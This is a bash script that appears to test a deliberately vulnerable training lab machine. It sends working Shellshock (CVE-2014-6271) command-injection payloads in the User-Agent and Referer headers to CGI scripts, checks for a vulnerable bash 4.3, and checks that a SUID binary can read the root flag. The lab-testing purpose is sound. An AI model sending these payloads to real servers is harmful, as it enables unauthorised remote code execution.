#!/bin/bash
# Machine 05: ShellShocked — CVE-2014-6271 Test
# Tests: Apache CGI on 80, Shellshock payload in User-Agent, SUID vuln-reader
source "$(dirname "$0")/_lib.sh"

BASE_DIR=${1:-$(dirname "$(dirname "$0")")}
CLEANUP=${2:-true}
MACHINE_DIR="$BASE_DIR/05-shellshocked"
COMPOSE="$MACHINE_DIR/docker-compose.yml"
CONTAINER="lm-05-shellshocked"
IP="10.10.5.10"

trap '[ "$CLEANUP" = true ] && stop_machine "$COMPOSE"' EXIT

section "Build & Start"
start_machine "$COMPOSE" "$CONTAINER" 120 || finish

section "Network Checks"
check_port "$IP" 80 "Apache HTTP"
check_port "$IP" 22 "SSH"

section "CGI Endpoint"
check_http "http://${IP}/cgi-bin/test.cgi" 200 "test.cgi reachable"
check_http "http://${IP}/cgi-bin/status.cgi" 200 "status.cgi reachable"
check_http_contains "http://${IP}/cgi-bin/test.cgi" "CGI Test OK" "test.cgi output"

section "Shellshock Exploit (CVE-2014-6271)"
# Classic Shellshock: function definition in env var followed by commands
PAYLOAD='() { :; }; echo "SHELLSHOCK_RCE=$(id)"'
shellshock_out=$(curl -sk --max-time 5 \
  -H "User-Agent: ${PAYLOAD}" \
  "http://${IP}/cgi-bin/test.cgi" 2>/dev/null)

if echo "$shellshock_out" | grep -q "SHELLSHOCK_RCE="; then
  pass "Shellshock RCE via User-Agent CONFIRMED (bash 4.3 vulnerable)"
  info "Output: $(echo "$shellshock_out" | grep SHELLSHOCK_RCE | head -1)"
else
  fail "Shellshock RCE NOT triggered — check bash 4.3 build and CGI config"
  info "curl output: $(echo "$shellshock_out" | head -5)"
fi

# Also test with Referer header
PAYLOAD2='() { :; }; echo "REFERER_RCE=$(whoami)"'
ref_out=$(curl -sk --max-time 5 \
  -H "Referer: ${PAYLOAD2}" \
  "http://${IP}/cgi-bin/status.cgi" 2>/dev/null)
echo "$ref_out" | grep -q "REFERER_RCE=" && \
  pass "Shellshock via Referer header also works" || \
  warn "Referer header injection not triggered"

section "Vulnerable Bash Version"
check_exec "$CONTAINER" "/opt/bash43/bin/bash --version" "4.3" "bash 4.3 installed"
check_exec "$CONTAINER" "head -1 /usr/lib/cgi-bin/test.cgi" "/opt/bash43/bin/bash" "CGI uses bash 4.3 shebang"

section "Flags"
check_exec "$CONTAINER" "cat /root/root.txt" "FLAG{" "Root flag"
check_exec "$CONTAINER" "cat /home/user/user.txt" "FLAG{" "User flag"

section "SUID Privesc (vuln-reader)"
check_exec "$CONTAINER" "ls -la /usr/local/bin/vuln-reader" "rws" "SUID bit set"
check_exec "$CONTAINER" "/usr/local/bin/vuln-reader /root/root.txt" "FLAG{" "SUID reads root flag"

finish
